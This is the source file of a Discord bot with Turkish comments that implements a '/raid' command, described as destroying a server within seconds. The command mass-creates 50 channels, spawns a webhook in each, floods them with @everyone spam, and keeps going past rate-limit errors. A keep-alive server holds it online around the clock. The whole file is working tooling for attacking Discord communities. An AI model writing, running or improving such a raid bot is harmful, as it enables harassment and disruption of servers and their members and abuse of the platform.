require('dotenv').config();
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, ChannelType } = require('discord.js');
const http = require('http');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const OWNER_ID = "1389930042200559706";

// --- RAID KOMUTU TANIMI ---
const commands = [
    new SlashCommandBuilder()
        .setName('raid')
        .setDescription('Sunucuyu saniyeler içinde imha eder.')
        .addStringOption(opt => opt.setName('mesaj').setDescription('Spam mesajı').setRequired(true))
        .addIntegerOption(opt => opt.setName('miktar').setDescription('Her kanala kaç mesaj?').setRequired(true))
].map(c => c.toJSON());

client.once('ready', async () => {
    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_BOT_TOKEN);
    try {
        await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
        console.log(`☣️ RAID MAKİNESİ AKTİF: ${client.user.tag}`);
    } catch (e) { console.error(e); }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: "❌ Yetkin yok!", ephemeral: true });

    if (interaction.commandName === 'raid') {
        const text = interaction.options.getString('mesaj');
        const amt = interaction.options.getInteger('miktar');

        await interaction.reply({ content: "☣️ **OPERASYON BAŞLATILDI.** Sunucu düşüyor...", ephemeral: true });

        // 50 Tane Kanal Açma Operasyonu
        for (let i = 0; i < 50; i++) {
            try {
                // Kanalı oluştur
                const channel = await interaction.guild.channels.create({
                    name: `raided-by-forces-${i}`,
                    type: ChannelType.GuildText
                });

                // Webhook oluştur (Hızın anahtarı budur)
                const webhook = await channel.createWebhook({
                    name: 'FORCES DESTROYER',
                });

                // Webhook üzerinden seri atış
                for (let j = 0; j < amt; j++) {
                    webhook.send({
                        content: `@everyone ${text}`,
                        username: 'FORCES RAID',
                    }).catch(() => {});
                    
                    // 1 saniye bekleme (Botun tamamen kapanmaması için şart)
                    await new Promise(r => setTimeout(r, 1000));
                }
            } catch (err) {
                // Limit yediğinde durma, devam et
                continue;
            }
        }
    }
});

// Render 7/24 Aktif Tutucu
http.createServer((req, res) => res.end("Raid System Online")).listen(process.env.PORT || 3000);

client.login(process.env.DISCORD_BOT_TOKEN);
